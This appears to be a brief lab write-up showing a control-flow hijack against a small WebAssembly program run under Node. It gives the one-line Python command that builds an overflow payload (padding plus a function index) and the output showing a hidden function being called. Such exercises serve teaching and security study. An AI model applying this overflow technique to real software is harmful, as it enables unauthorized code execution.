# Flow Hijack
1. **Create the payload**
```
python3 -c 'open("payload.bin", "wb").write(4 * b"A" + b"\x02")'
```

2. **Run the program with the payload**
```
cat payload.bin | node main.js                                  
I have a function so coooool right here: 0x2
README.md  main.c  main.js  main.wasm  main.wat  payload.bin
```